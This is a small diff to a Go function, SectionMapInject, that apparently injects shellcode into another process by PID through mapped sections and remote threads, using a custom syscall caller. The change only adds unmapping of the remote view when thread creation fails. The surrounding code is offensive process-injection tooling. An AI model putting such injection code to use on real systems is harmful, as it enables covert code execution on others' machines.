@@ -95,6 +95,7 @@ func SectionMapInject(pid int, shellcode []byte, caller *wsyscall.Caller) error 
 			0, 0, 0, 0, 0,
 		)
 		if r != 0 {
+			ntUnmapView(caller, uintptr(hProcess), remoteBase)
 			return fmt.Errorf("remote thread creation failed: NTSTATUS 0x%X", r)
 		}
 	} else {
@@ -105,6 +106,7 @@ func SectionMapInject(pid int, shellcode []byte, caller *wsyscall.Caller) error 
 			0, 0, 0,
 		)
 		if ret == 0 {
+			ntUnmapView(caller, uintptr(hProcess), remoteBase)
 			return fmt.Errorf("remote thread creation failed: %w", callErr)
 		}
 		hThread = ret
